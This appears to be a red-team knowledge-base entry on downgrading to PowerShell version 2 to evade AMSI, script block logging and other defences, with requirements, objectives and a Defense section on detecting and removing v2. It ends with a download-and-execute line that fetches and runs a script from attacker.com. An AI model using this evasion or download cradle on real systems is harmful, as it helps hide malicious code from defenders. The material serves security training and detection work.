---
type: procedure
tactics:
  - '[[Defense Evasion]]'
techniques:
  - '[[PowerShell]]'
sub_techniques: []
tags:
  - bypass
  - downgrade
  - powershell
commands:
  - '[[commands/start-powershell-version-2]]'
platforms:
  - Windows
tools: []
verified: true
validated: true
---

# Downgrade-PowerShell-to-Version-2

## Summary

This procedure enables switching to PowerShell version 2 on a Windows system, which lacks advanced security features like constrained language mode, script block logging, and enhanced execution policies found in PowerShell 5.0 and later. It is useful for evading detection and restrictions during offensive security operations or red team engagements where modern PowerShell mitigations hinder script execution.

## Description

PowerShell version 2, released in 2009, is often still present on Windows systems, especially older ones like Windows 7 or servers not fully updated. Newer versions introduce defenses such as Antimalware Scan Interface (AMSI) integration, module logging, and transcription, which can log or block malicious scripts. By downgrading to v2, attackers can run commands and scripts in a less monitored environment. This technique is particularly effective in environments where PowerShell v2 has not been explicitly removed via DISM or other methods. Use this when initial attempts with modern PowerShell fail due to policy restrictions or logging.

## Requirements

1. A Windows operating system with PowerShell v2 installed (default on Windows 7 and some Server editions; check with `Get-Host` or `$PSVersionTable`).
2. User-level access to execute PowerShell (administrative privileges may be needed if execution policies are enforced).
3. No group policies blocking version downgrades or PowerShell execution.

## Defense

Defensive measures and detection strategies:

- Remove PowerShell v2 using DISM: `dism /online /disable-feature /featurename:MicrosoftWindowsPowerShellV2` and reboot.
- Enable comprehensive PowerShell logging via Group Policy (Script Block, Module, and Transcription logging) to monitor all versions.
- Implement application whitelisting with AppLocker or Windows Defender Application Control to restrict PowerShell to signed scripts only.
- Monitor process creation events (Event ID 4688) for `powershell.exe -version 2` invocations using EDR tools like Sysmon or Microsoft Defender for Endpoint.

## Objectives

1. Initiate a PowerShell session using version 2 to bypass modern security controls.
2. Verify the downgrade to ensure reduced logging and policy enforcement.
3. Enable execution of scripts that would be blocked or logged in newer versions.

## Instructions

### Step 1: Launch PowerShell Version 2 Session

**Context**: This step starts a new PowerShell process limited to version 2, confirming the downgrade by checking the host version afterward. It assumes PowerShell v2 is available; if not, installation or alternative evasion techniques are required.

**Command** ([[commands/start-powershell-version-2]]):
```powershell
powershell -version 2
```

> This command spawns a new PowerShell instance using the `-version` parameter to specify v2. Once in the v2 session, verify the version with `$host.Version` or `$PSVersionTable`, which should show Major: 2. Expected output includes a PS prompt without modern features. If v2 is unavailable, the command fails with an error like "Version 2 is not installed." Success allows running scripts like `IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')` without AMSI interference.
